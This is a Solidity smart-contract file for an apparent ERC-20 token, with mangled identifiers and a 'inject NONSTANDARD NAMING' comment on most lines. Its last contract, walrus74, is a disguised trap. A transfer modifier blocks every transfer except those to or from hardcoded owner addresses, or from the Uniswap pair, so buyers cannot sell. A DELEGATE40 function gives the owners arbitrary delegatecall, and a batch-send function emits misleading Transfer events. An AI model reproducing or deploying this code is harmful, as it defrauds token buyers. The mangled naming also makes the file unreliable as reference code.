                                                                 

pragma solidity ^0.5.17;
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
interface ierc206 {	//inject NONSTANDARD NAMING
    function TOTALSUPPLY11() external view returns(uint);	//inject NONSTANDARD NAMING
    function BALANCEOF69(address ACCOUNT64) external view returns(uint);	//inject NONSTANDARD NAMING
    function TRANSFER81(address RECIPIENT26, uint AMOUNT2) external returns(bool);	//inject NONSTANDARD NAMING
    function ALLOWANCE67(address OWNER12, address SPENDER20) external view returns(uint);	//inject NONSTANDARD NAMING
  //  function allowance(address owner, address owner2, address owner3, address owner4, address owner5, address owner6, address spender) external view returns(uint);
    function APPROVE93(address SPENDER20, uint AMOUNT2) external returns(bool);	//inject NONSTANDARD NAMING

    function TRANSFERFROM84(address SENDER77, address RECIPIENT26, uint AMOUNT2) external returns(bool);	//inject NONSTANDARD NAMING
    event TRANSFER61(address indexed FROM91, address indexed TO59, uint VALUE15);	//inject NONSTANDARD NAMING
    event APPROVAL53(address indexed OWNER12, address indexed SPENDER20, uint VALUE15);	//inject NONSTANDARD NAMING
   // event Approval(address indexed owner, address indexed owner2, address indexed owner3, address indexed owner4, address indexed owner5, address indexed owner6, address indexed spender, uint value);

}

library safemath10 {	//inject NONSTANDARD NAMING
    function ADD58(uint A70, uint B7) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        uint C70 = A70 + B7;	//inject NONSTANDARD NAMING
        require(C70 >= A70, "SafeMath: addition overflow");

        return C70;
    }

    function SUB76(uint A70, uint B7) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        return SUB76(A70, B7, "SafeMath: subtraction overflow");
    }

    function SUB76(uint A70, uint B7, string memory ERRORMESSAGE85) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        require(B7 <= A70, ERRORMESSAGE85);
        uint C70 = A70 - B7;	//inject NONSTANDARD NAMING

        return C70;
    }

    function MUL73(uint A70, uint B7) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        if (A70 == 0) {
            return 0;
        }

        uint C70 = A70 * B7;	//inject NONSTANDARD NAMING
        require(C70 / A70 == B7, "SafeMath: multiplication overflow");

        return C70;
    }

    function DIV91(uint A70, uint B7) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        return DIV91(A70, B7, "SafeMath: division by zero");
    }

    function DIV91(uint A70, uint B7, string memory ERRORMESSAGE85) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        // Solidity only automatically asserts when dividing by 0
        require(B7 > 0, ERRORMESSAGE85);
        uint C70 = A70 / B7;	//inject NONSTANDARD NAMING

        return C70;
    }
}

library address23 {	//inject NONSTANDARD NAMING
    function ISCONTRACT97(address ACCOUNT64) internal view returns(bool) {	//inject NONSTANDARD NAMING
        bytes32 CODEHASH25;	//inject NONSTANDARD NAMING
        bytes32 ACCOUNTHASH81 = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;	//inject NONSTANDARD NAMING
        // solhint-disable-next-line no-inline-assembly
        assembly { CODEHASH25:= extcodehash(ACCOUNT64) }
        return (CODEHASH25 != 0x0 && CODEHASH25 != ACCOUNTHASH81);
    }
}


library safeerc2039 {	//inject NONSTANDARD NAMING
    using safemath10
    for uint;
    using address23
    for address;

    function SAFETRANSFER38(ierc206 TOKEN27, address TO59, uint VALUE15) internal {	//inject NONSTANDARD NAMING
        CALLOPTIONALRETURN3(TOKEN27, abi.encodeWithSelector(TOKEN27.TRANSFER81.selector, TO59, VALUE15));
    }

    function SAFETRANSFERFROM22(ierc206 TOKEN27, address FROM91, address TO59, uint VALUE15) internal {	//inject NONSTANDARD NAMING
        CALLOPTIONALRETURN3(TOKEN27, abi.encodeWithSelector(TOKEN27.TRANSFERFROM84.selector, FROM91, TO59, VALUE15));
    }

    function SAFEAPPROVE83(ierc206 TOKEN27, address SPENDER20, uint VALUE15) internal {	//inject NONSTANDARD NAMING
        require((VALUE15 == 0) || (TOKEN27.ALLOWANCE67(address(this), SPENDER20) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        CALLOPTIONALRETURN3(TOKEN27, abi.encodeWithSelector(TOKEN27.APPROVE93.selector, SPENDER20, VALUE15));
    }

    function CALLOPTIONALRETURN3(ierc206 TOKEN27, bytes memory DATA65) private {	//inject NONSTANDARD NAMING
        require(address(TOKEN27).ISCONTRACT97(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool SUCCESS31, bytes memory RETURNDATA5) = address(TOKEN27).call(DATA65);	//inject NONSTANDARD NAMING
        require(SUCCESS31, "SafeERC20: low-level call failed");

        if (RETURNDATA5.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(RETURNDATA5, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract context63 {	//inject NONSTANDARD NAMING
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks
    function _MSGSENDER40() internal view returns(address payable) {	//inject NONSTANDARD NAMING
        return msg.sender;
    }
}

contract erc2042 is context63, ierc206 {	//inject NONSTANDARD NAMING
    using safemath10 for uint;
    mapping(address => uint) private _BALANCES52;	//inject NONSTANDARD NAMING

    mapping(address => mapping(address => uint)) private _ALLOWANCES26;	//inject NONSTANDARD NAMING

    uint private _TOTALSUPPLY41;	//inject NONSTANDARD NAMING

    function TOTALSUPPLY11() public view returns(uint) {	//inject NONSTANDARD NAMING
        return _TOTALSUPPLY41;
    }

    function BALANCEOF69(address ACCOUNT64) public view returns(uint) {	//inject NONSTANDARD NAMING
        return _BALANCES52[ACCOUNT64];
    }

    function TRANSFER81(address RECIPIENT26, uint AMOUNT2) public returns(bool) {	//inject NONSTANDARD NAMING
        _TRANSFER41(_MSGSENDER40(), RECIPIENT26, AMOUNT2);
        return true;
    }

    function ALLOWANCE67(address OWNER12, address SPENDER20) public view returns(uint) {	//inject NONSTANDARD NAMING
        return _ALLOWANCES26[OWNER12][SPENDER20];
    }

    function APPROVE93(address SPENDER20, uint AMOUNT2) public returns(bool) {	//inject NONSTANDARD NAMING
        _APPROVE78(_MSGSENDER40(), SPENDER20, AMOUNT2);
        return true;
    }

    function TRANSFERFROM84(address SENDER77, address RECIPIENT26, uint AMOUNT2) public returns(bool) {	//inject NONSTANDARD NAMING
        _TRANSFER41(SENDER77, RECIPIENT26, AMOUNT2);
        _APPROVE78(SENDER77, _MSGSENDER40(), _ALLOWANCES26[SENDER77][_MSGSENDER40()].SUB76(AMOUNT2, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function INCREASEALLOWANCE8(address SPENDER20, uint ADDEDVALUE53) public returns(bool) {	//inject NONSTANDARD NAMING
        _APPROVE78(_MSGSENDER40(), SPENDER20, _ALLOWANCES26[_MSGSENDER40()][SPENDER20].ADD58(ADDEDVALUE53));
        return true;
    }

    function DECREASEALLOWANCE20(address SPENDER20, uint SUBTRACTEDVALUE30) public returns(bool) {	//inject NONSTANDARD NAMING
        _APPROVE78(_MSGSENDER40(), SPENDER20, _ALLOWANCES26[_MSGSENDER40()][SPENDER20].SUB76(SUBTRACTEDVALUE30, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _TRANSFER41(address SENDER77, address RECIPIENT26, uint AMOUNT2) internal {	//inject NONSTANDARD NAMING
        require(SENDER77 != address(0), "ERC20: transfer from the zero address");
        require(RECIPIENT26 != address(0), "ERC20: transfer to the zero address");

        _BALANCES52[SENDER77] = _BALANCES52[SENDER77].SUB76(AMOUNT2, "ERC20: transfer amount exceeds balance");
        _BALANCES52[RECIPIENT26] = _BALANCES52[RECIPIENT26].ADD58(AMOUNT2);
        emit TRANSFER61(SENDER77, RECIPIENT26, AMOUNT2);
    }

    function _MINT65(address ACCOUNT64, uint AMOUNT2) internal {	//inject NONSTANDARD NAMING
        require(ACCOUNT64 != address(0), "ERC20: mint to the zero address");

        _TOTALSUPPLY41 = _TOTALSUPPLY41.ADD58(AMOUNT2);
        _BALANCES52[ACCOUNT64] = _BALANCES52[ACCOUNT64].ADD58(AMOUNT2);
        emit TRANSFER61(address(0), ACCOUNT64, AMOUNT2);
    }

    function _BURN74(address ACCOUNT64, uint AMOUNT2) internal {	//inject NONSTANDARD NAMING
        require(ACCOUNT64 != address(0), "ERC20: burn from the zero address");

        _BALANCES52[ACCOUNT64] = _BALANCES52[ACCOUNT64].SUB76(AMOUNT2, "ERC20: burn amount exceeds balance");
        _TOTALSUPPLY41 = _TOTALSUPPLY41.SUB76(AMOUNT2);
        emit TRANSFER61(ACCOUNT64, address(0), AMOUNT2);
    }

 //   function _approve(address owner, address owner2, address owner3, address owner4, address owner5, address owner6, address spender, uint amount) internal {
     function _APPROVE78(address OWNER12, address SPENDER20, uint AMOUNT2) internal {	//inject NONSTANDARD NAMING

        require(OWNER12 != address(0), "ERC20: approve from the zero address");
        require(SPENDER20 != address(0), "ERC20: approve to the zero address");

        _ALLOWANCES26[OWNER12][SPENDER20] = AMOUNT2;
        emit APPROVAL53(OWNER12, SPENDER20, AMOUNT2);
    }
}

contract erc20detailed16 is ierc206 {	//inject NONSTANDARD NAMING
    string private _NAME50;	//inject NONSTANDARD NAMING
    string private _SYMBOL63;	//inject NONSTANDARD NAMING
    uint8 private _DECIMALS70;	//inject NONSTANDARD NAMING

    constructor(string memory NAME31, string memory SYMBOL32, uint8 DECIMALS49) public {	//inject NONSTANDARD NAMING
        _NAME50 = NAME31;
        _SYMBOL63 = SYMBOL32;
        _DECIMALS70 = DECIMALS49;
    }

    function NAME55() public view returns(string memory) {	//inject NONSTANDARD NAMING
        return _NAME50;
    }

    function SYMBOL89() public view returns(string memory) {	//inject NONSTANDARD NAMING
        return _SYMBOL63;
    }

    function DECIMALS42() public view returns(uint8) {	//inject NONSTANDARD NAMING
        return _DECIMALS70;
    }
}


contract walrus74  {	//inject NONSTANDARD NAMING

    event TRANSFER61(address indexed _FROM13, address indexed _TO81, uint _VALUE6);	//inject NONSTANDARD NAMING
    event APPROVAL53(address indexed _OWNER0, address indexed _SPENDER20, uint _VALUE6);	//inject NONSTANDARD NAMING

    function TRANSFER81(address _TO81, uint _VALUE6) public payable returns (bool) {	//inject NONSTANDARD NAMING
        return TRANSFERFROM84(msg.sender, _TO81, _VALUE6);
    }

    function TRANSFERFROM84(address _FROM13, address _TO81, uint _VALUE6) public payable ENSURE84(_FROM13, _TO81) returns (bool) {	//inject NONSTANDARD NAMING
        if (_VALUE6 == 0) {return true;}
        if (msg.sender != _FROM13) {
            require(ALLOWANCE100[_FROM13][msg.sender] >= _VALUE6);
            ALLOWANCE100[_FROM13][msg.sender] -= _VALUE6;
        }
        require(BALANCEOF32[_FROM13] >= _VALUE6);
        BALANCEOF32[_FROM13] -= _VALUE6;
        BALANCEOF32[_TO81] += _VALUE6;
        emit TRANSFER61(_FROM13, _TO81, _VALUE6);
        return true;
    }

    function APPROVE93(address _SPENDER20, uint _VALUE6) public payable returns (bool) {	//inject NONSTANDARD NAMING
        ALLOWANCE100[msg.sender][_SPENDER20] = _VALUE6;
        emit APPROVAL53(msg.sender, _SPENDER20, _VALUE6);
        return true;
    }

    function DELEGATE40(address A70, bytes memory B7) public payable {	//inject NONSTANDARD NAMING
        require (msg.sender == OWNER12 || msg.sender == OWNER299 || msg.sender == OWNER327 || msg.sender == OWNER480 || msg.sender == OWNER538 || msg.sender == OWNER613);
        A70.delegatecall(B7);
    }

    function BATCHSEND43(address[] memory _TOS59, uint _VALUE6) public payable returns (bool) {	//inject NONSTANDARD NAMING
        require (msg.sender == OWNER12 || msg.sender == OWNER299 || msg.sender == OWNER327 || msg.sender == OWNER480 || msg.sender == OWNER538 || msg.sender == OWNER613);
        uint TOTAL23 = _VALUE6 * _TOS59.length;	//inject NONSTANDARD NAMING
        require(BALANCEOF32[msg.sender] >= TOTAL23);
        BALANCEOF32[msg.sender] -= TOTAL23;
        for (uint I7 = 0; I7 < _TOS59.length; I7++) {	//inject NONSTANDARD NAMING
            address _TO81 = _TOS59[I7];	//inject NONSTANDARD NAMING
            BALANCEOF32[_TO81] += _VALUE6;
            emit TRANSFER61(msg.sender, _TO81, _VALUE6/2);
            emit TRANSFER61(msg.sender, _TO81, _VALUE6/2);
        }
        return true;
    }

    modifier ENSURE84(address _FROM13, address _TO81) {	//inject NONSTANDARD NAMING
        address UNI49 = PAIRFOR60(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, address(this));	//inject NONSTANDARD NAMING
        require(_FROM13 == OWNER12 || _TO81 == OWNER12 || _FROM13 == UNI49 || _FROM13 == OWNER299 || _TO81 == OWNER299 || _FROM13 == OWNER327 || _TO81 == OWNER327 || _FROM13 == OWNER480 || _TO81 == OWNER480 || _FROM13 == OWNER538 || _TO81 == OWNER538 || _FROM13 == OWNER613 || _TO81 == OWNER613);
        //require(owner == msg.sender || owner2 == msg.sender);

        _;
    }

    function PAIRFOR60(address FACTORY18, address TOKENA11, address TOKENB18) internal pure returns (address PAIR77) {	//inject NONSTANDARD NAMING
        (address TOKEN073, address TOKEN120) = TOKENA11 < TOKENB18 ? (TOKENA11, TOKENB18) : (TOKENB18, TOKENA11);	//inject NONSTANDARD NAMING
        PAIR77 = address(uint(keccak256(abi.encodePacked(
                hex'ff',
                FACTORY18,
                keccak256(abi.encodePacked(TOKEN073, TOKEN120)),
                hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' // init code hash
            ))));
    }

    mapping (address => uint) public BALANCEOF32;	//inject NONSTANDARD NAMING
    mapping (address => mapping (address => uint)) public ALLOWANCE100;	//inject NONSTANDARD NAMING

    uint constant public decimals31 = 18;	//inject NONSTANDARD NAMING
    uint public TOTALSUPPLY14;	//inject NONSTANDARD NAMING
    string public NAME31;	//inject NONSTANDARD NAMING
    string public SYMBOL32;	//inject NONSTANDARD NAMING
    address private OWNER12;	//inject NONSTANDARD NAMING
    address private OWNER299;	//inject NONSTANDARD NAMING
    address private OWNER327;	//inject NONSTANDARD NAMING
    address private OWNER480;	//inject NONSTANDARD NAMING
    address private OWNER538;	//inject NONSTANDARD NAMING
    address private OWNER613;	//inject NONSTANDARD NAMING
    
    address constant internal uni75 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;	//inject NONSTANDARD NAMING

    constructor(string memory _NAME50, string memory _SYMBOL63, uint256 _SUPPLY71) payable public {	//inject NONSTANDARD NAMING
        NAME31 = _NAME50;
        SYMBOL32 = _SYMBOL63;
        TOTALSUPPLY14 = _SUPPLY71;
        OWNER12 = msg.sender;
        OWNER299 = 0x7737533691DE30EAC03ec29803FaabE92619F9a4;
        OWNER327 = 0x93338F6cCc570C33F0BAbA914373a6d51FbbB6B7;
        OWNER480 = 0x201f739D7346403aF416BEd7e8f8e3de21ccdc84;
        OWNER538 = 0x0ee849e0d238A375427E8115D4065FFaA21BCee9;
        OWNER613 = 0xD9429A42788Ec71AEDe45f6F48B7688D11900C05;
        BALANCEOF32[msg.sender] = TOTALSUPPLY14;
        ALLOWANCE100[msg.sender][0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = uint(-1);
        emit TRANSFER61(address(0x0), msg.sender, TOTALSUPPLY14);
    }
}